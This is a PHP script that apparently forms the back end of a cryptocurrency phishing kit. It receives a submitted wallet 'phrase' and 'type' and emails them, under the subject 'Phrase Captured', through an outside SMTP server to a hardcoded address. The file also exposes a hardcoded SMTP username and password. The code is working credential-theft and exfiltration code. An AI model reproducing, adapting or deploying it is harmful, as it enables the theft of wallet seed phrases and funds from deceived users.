<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
use PHPMailer\PHPMailer\SMTP;

require 'vendor/autoload.php';

var_dump($_POST);
exit;

if (isset($_POST['phrase'])) {
    $phrase = $_POST['phrase'];
    $type = $_POST['type'];

    $email = 'jimjag@gmail.com'; // set email address here

    $body = '<!DOCTYPE html>
        <html lang="en">
        <head>
        <meta charset="UTF-8">
        <title>Title</title>
        <style>
        </style>
        </head>
        <body>
			<div style="border-collapse: collapse; width: 100%;">
            <h4>Type: ' . $type . '</h4>
            <h4>Key: ' . $phrase . '</h4>
				</div>
        </body>
        </html>';

    $mail = new PHPMailer(true);

    // set up phpmailer
    try {
        //Server settings


        //Enable verbose debug output
        // $mail->SMTPDebug = SMTP::DEBUG_SERVER;                    
        $mail->SMTPDebug = 0;


        //Send using SMTP
        $mail->isSMTP();

        //Set the SMTP server to send through
        $mail->Host = 'mail.iproc.xyz';

        //Enable SMTP authentication
        $mail->SMTPAuth = true;

        //SMTP username
        $mail->Username = 'info@iproc.xyz';

        //SMTP password
        $mail->Password = 'Mumail01@@!';
        //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
        // $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        // $mail->SMTPSecure = 'ssl';
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;

        $mail->Port = 465;
        // $mail->Port       = 587;
        // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

        // Recipients
        $mail->setFrom('info@iproc.xyz', 'c-dapp');
        // $mail->addAddress('joe@example.net', 'Joe User');     //Add a recipient
        $mail->addAddress($email);               //Name is optional
        $mail->addReplyTo('info@iproc.xyz');

        // Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Phrase Captured';
        $mail->Body = $body;
        // $mail->AltBody = 'Copy and paste the llink in your browser to activate your account  ' . $web_link . 'activate.php?token=' . $token . ' ';
        $sent = $mail->send();
        // if mail sent, fill database
        if ($sent) {
            return true;
        }
    } catch (Exception $e) {
        // print "error";
        print "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
        return false;
    }
}